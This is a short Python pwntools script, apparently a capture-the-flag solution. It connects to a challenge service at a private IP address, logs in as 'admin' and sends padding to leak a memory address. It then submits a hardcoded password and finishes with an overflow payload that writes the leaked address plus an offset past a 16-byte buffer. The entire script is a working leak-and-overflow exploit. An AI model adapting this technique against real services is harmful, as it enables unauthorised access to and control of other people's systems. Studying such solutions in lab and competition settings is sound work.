from pwn import *

#p = process("./data/chall")
p = remote("10.22.148.11", 1338)
print(p.recv())
p.sendline(b"admin")
print(p.recv())
p.sendline(b"A"*16)
print(p.recvuntil(b"A"*16))
leak = p.recv(6)
leak = int.from_bytes(leak,"little")
print(hex(leak))
print(p.recv())
p.sendline(b"p@s5w0rd")
print(p.recv())
print(p.recv())
p.sendline(b"A"*16+p64(leak+76)+p64(leak+76))
print(p.recvall())
p.close()
